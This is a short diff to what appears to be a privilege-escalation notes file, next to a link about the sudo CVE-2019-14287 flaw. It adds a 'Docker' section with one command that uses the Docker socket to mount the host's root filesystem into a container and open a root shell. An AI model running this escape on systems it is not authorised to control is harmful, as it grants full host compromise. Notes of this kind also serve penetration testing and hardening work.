@@ -4,3 +4,8 @@
 
 Read more: [https://www.mend.io/blog/new-vulnerability-in-sudo-cve-2019-14287/](https://www.mend.io/blog/new-vulnerability-in-sudo-cve-2019-14287/)
 
+## Docker
+
+```bash
+docker -H unix:///var/run/docker.sock run -v /:/host -it alpine chroot /host /bin/bash
+```
